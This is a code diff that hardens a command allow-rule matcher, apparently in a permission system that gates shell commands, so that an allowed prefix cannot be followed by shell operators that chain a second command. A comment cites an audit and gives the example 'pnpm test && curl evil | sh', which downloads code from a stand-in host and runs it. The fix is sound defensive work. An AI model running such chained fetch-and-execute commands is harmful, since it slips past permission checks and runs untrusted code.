@@ -91,5 +91,14 @@ function matches(rule: AllowRule, query: PermissionQuery): boolean {
   if (!command.startsWith(rule.commandPrefix)) return false;
   // Word boundary: "pnpm test" must not authorize "pnpm testament".
   const next = command.charAt(rule.commandPrefix.length);
-  return next === '' || /\s/.test(next);
+  if (next !== '' && !/\s/.test(next)) return false;
+  // A shell operator after the prefix starts ANOTHER command: "pnpm test &&
+  // curl evil | sh" begins with the prefix and has a space next, and every
+  // operator behind a space was authorised (audit, 2026-08-28). The rule
+  // covers arguments, never a second command, a pipe, a redirection or a
+  // substitution.
+  return !SHELL_OPERATOR.test(command.slice(rule.commandPrefix.length));
 }
+
+/** What turns "the same command with arguments" into something else: ; & | < > $ ` and a line break. */
+const SHELL_OPERATOR = /[;&|<>$`\n]/;
